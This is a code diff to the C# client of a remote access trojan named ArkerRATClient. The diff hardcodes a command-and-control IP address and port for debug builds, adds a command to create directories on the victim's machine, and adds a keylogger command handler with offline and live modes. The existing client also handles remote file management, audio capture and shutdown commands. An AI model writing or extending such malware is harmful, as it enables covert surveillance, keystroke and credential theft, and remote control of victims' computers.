@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -21,9 +21,13 @@ namespace ArkerRATClient
 {
     public static class RATClientSession
     {
+#if DEBUG
         private static int port = 2332;
-        private static string ip = "78.72.90.139";
-
+        private static string ip ="78.72.90.139";
+#else
+        private static int port = 0;
+        private static string ip ="";
+#endif
         public static TcpClient tcpClient { get; set; }
         public static bool noConnection = true;
         public static bool isSendingData = false;
@@ -31,6 +35,7 @@ namespace ArkerRATClient
 
         public static async void ClientSession()
         {
+            
             try
             {
                 tcpClient = new TcpClient(ip, port);
@@ -115,6 +120,7 @@ namespace ArkerRATClient
                         await Task.Run(() => SortData("§ReconnectStart§", "§ReconnectEnd§"));
                         await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
                         await Task.Run(() => SortData("§RemoteAudioStart§", "§RemoteAudioEnd§"));
+                        await Task.Run(() => SortData("§KeyLoggerStart§", "§KeyLoggerEnd§"));
 
 
                         await Task.Run(() => SortData("§ShutDownStart§", "§ShutDownEnd§"));
@@ -205,7 +211,12 @@ namespace ArkerRATClient
                         }
                         else if(startDelimiter == "§FileManagerStart§")
                         {
-                            if (subString.Contains("§UF§"))
+                            if (subString.Contains("§ND§"))
+                            {
+                                subString = subString.Replace("§ND§", string.Empty);
+                                FileManager.CreateNewDirectory(subString);
+                            }
+                            else if (subString.Contains("§UF§"))
                             {
                                 subString = subString.Replace("§UF§", string.Empty);
 
@@ -246,9 +257,45 @@ namespace ArkerRATClient
                             }
                             else
                             {
-
                                 FileManager.SendFileSystem(subString);
                             }
+                        }
+                        else if(startDelimiter == "§KeyLoggerStart§")
+                        {
+                            if (subString.Contains("§OFK§")) {
+                                subString = subString.Replace("§OFK§", string.Empty);
+
+                                if (subString == "close")
+                                {
+                                    KeyLogger.CloseOfflineKeyLogger();
+                                }
+                                else if(subString=="start")
+                                {
+                                    KeyLogger.StartOfflineKeylogger();
+                                }
+                            }
+                            else if(subString.Contains("§live§"))
+                            {
+                                subString = subString.Replace("§live§", string.Empty);
+                                
+                                if (subString == "close")
+                                {
+                                    KeyLogger.CloseLiveKeyLogger();
+                                }
+                                else if (subString == "start")
+                                {
+                                    KeyLogger.StartLiveKeyLogger();
+                                }
+                            }
+                            else if (subString == "start")
+                            {
+                                KeyLogger.keyLoggingThread = Task.Run(() => KeyLogger.StartKeyLogger());
+                            }
+                            else if(subString=="close")
+                            {
+                                KeyLogger.StopKeyLogger();
+                            }
+                            
                         }
                         else if (startDelimiter == "§PingStart§")
                         {
